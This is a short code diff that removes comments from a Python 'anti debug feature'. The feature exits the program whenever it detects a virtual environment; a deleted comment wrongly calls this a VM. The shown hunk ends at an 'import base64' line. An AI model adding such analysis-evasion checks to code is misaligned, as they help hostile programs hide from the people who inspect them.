@@ -1,14 +1,14 @@
 #new anti debug feature
-import sys # only lib needed
+import sys 
 
-def get_base_prefix_compat(): # define all of the checks
+def get_base_prefix_compat(): 
     return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix
 
 def in_virtualenv(): 
     return get_base_prefix_compat() != sys.prefix
 
-if in_virtualenv() == True: # if we are in a vm
-    sys.exit() # exit
+if in_virtualenv() == True: 
+    sys.exit() 
 #new anti debug feature
 
 import base64
